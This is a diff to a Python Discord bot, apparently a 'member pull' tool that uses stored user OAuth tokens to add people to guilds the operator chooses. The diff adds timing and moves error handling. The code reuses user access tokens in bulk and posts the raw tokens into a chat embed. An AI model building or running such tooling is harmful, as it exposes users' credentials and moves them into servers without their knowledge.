@@ -1,4 +1,4 @@
-import discord, json, requests, os
+import discord, json, requests, os, time
 from pystyle import *
 from discord import *
 from discord.ui import *
@@ -29,40 +29,43 @@ with open("saved.json", "r+") as a:
     print("[...] Checking for tokens")
     aa = json.load(a)
     if aa['config']['bot_token'] == "":
-        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: {Colors.light_blue}")
+        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: ")
 
     else:
         token = aa['config']['bot_token']
-    role_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter Role id: {Colors.light_blue}")
-    client_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter client id: {Colors.light_blue}")
-    url_hosted = input(f"{Colors.light_blue}[>] {Colors.blue}Enter URL you're hosting with if testing locally type (http://localhost:8080): {Colors.light_blue}")
+    role_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter Role id: ")
+    client_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter client id: ")
+    url_hosted = input(f"{Colors.light_blue}[>] {Colors.blue}Enter URL you're hosting with if testing locally type (http://localhost:8080): ")
+
 bot = commands.Bot(command_prefix="-", help_command=None, intents=discord.Intents.all())
 
 @bot.command()
 async def pull(ctx, token2, guild_id, uid):
     try:
         a = pull_to_guild(token, token2, guild_id, uid)
-
+        print(a)
         await ctx.send(embed=Embed(title="Pulled user", description=f"Sucessfully added the user to the guild!"))
     except:
         await ctx.send(embed=Embed(title="Failed to pull user", description=f"This didn't seem to work :(!"))
 
 @bot.command()
 async def pull_all(ctx, guild_id):
+    start = time.time()
     failed = []
     allowed = []
     with open("saved.json", "r+") as f:
         ff = json.load(f)
         array = ff['array']
         for x in array:
-            info = get_user_data(x)
-            id = str(info['id'])
             try:
+                info = get_user_data(x)
+                id = str(info['id'])
                 pull_to_guild(token, x, guild_id, id)
                 allowed.append(x)
             except Exception as e:
                 failed.append(x)
-        await ctx.send(embed=Embed(title="Pull summary", description=f"**Auth tokens pulled to guild:** {allowed}\n**Failed to pull:** {failed}", color=discord.Color.blurple()))
+        end = time.time()
+        await ctx.send(embed=Embed(title="Pull summary", description=f"**Auth tokens pulled to guild:** {allowed}\n**Failed to pull:** {failed}\n**Time taken:** `{end-start} seconds`", color=discord.Color.blurple()))
 
          
 
